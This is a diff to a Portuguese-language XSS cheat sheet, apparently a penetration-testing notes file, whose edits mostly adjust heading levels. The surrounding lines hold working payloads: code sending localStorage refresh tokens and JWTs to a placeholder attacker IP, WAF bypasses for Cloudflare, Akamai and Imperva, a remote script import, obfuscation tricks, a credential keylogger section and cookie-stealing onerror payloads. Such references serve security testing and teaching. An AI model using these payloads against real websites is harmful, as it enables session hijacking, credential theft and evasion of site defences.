@@ -22,7 +22,7 @@
 - XSS Armazenado
      - Verifique se o código é executado mesmo quando uma nova sessão é iniciada ou usando outras contas de usuário
 
-## Captura dados do Local Storage
+### Captura dados do Local Storage
 ```
 # captura dados do Local Storage
 document.location='http://[IP-Servidor-Externo]:8080/'+localStorage.getItem('refresh_token');
@@ -30,9 +30,8 @@ document.location='http://[IP-Servidor-Externo]:8080/'+localStorage.getItem('ref
 # JSON.stringify(localStorage)
 <img src='https://[IP-Atacante]/yikes?jwt='+JSON.stringify(localStorage);'--!>
 ```
-##
 
-## Captura de Cookies
+### Captura de Cookies com imagem .svg
 ### SVG Upload File
 Upload do arquivo .svg com o código para captura dos valores em um parâmetro armazenado no Local Storage
 ```
@@ -62,7 +61,7 @@ Bypass Geral
 XSS Found in "/lib/css/animated.min'"/>
 <script%20>alert(document.domain)<%2fscript>.css"
 ```
-## Bypass Cloudflare WAF
+### Bypass Cloudflare WAF
 ```
 %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
 
@@ -81,15 +80,15 @@ HTML entity & URL encoding:
 
 "><img src=x onerrora=confirm() onerror=confirm(1)>
 ```
-## Bypass Akamai JSi
+### Bypass Akamai JSi
 ```
 ';k='e'%0Atop['al'+k+'rt'](1)//
 ```
-## Bypass Imperva HTMLi
+### Bypass Imperva HTMLi
 ```
 <Img Src=//X55.is OnLoad%0C=import(Src)>
 ```
-## Basic XSS Encoding Tips
+### Basic XSS Encoding Tips
 ```
 1) alert = window["al"+"ert"] 
 2) bypass () with `` 
@@ -106,7 +105,7 @@ HTML entity & URL encoding:
 Example Payload:
 %3csvg/onload=window%5b"al"+"ert"%5d`1337`%3e
 ```
-## Captura de credencial 
+### Captura de credencial 
 ### Servidor-Atacante: Adicionar o script keylog.php no path /var/www/html/
 
 ```
@@ -236,7 +235,7 @@ xsser --url "[URL]?[campo]=[valor]&[campo]=[valor]&[campo]=XSS&[campo]=[valor]&[
 <span onmouseover="console.info("teste")">Teste</span>
 ```
 ### XSS Evasion
-`` 
+```
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;()&rpar;">X</a>
 
 <img src=x onerror=alert(document.cookie);>
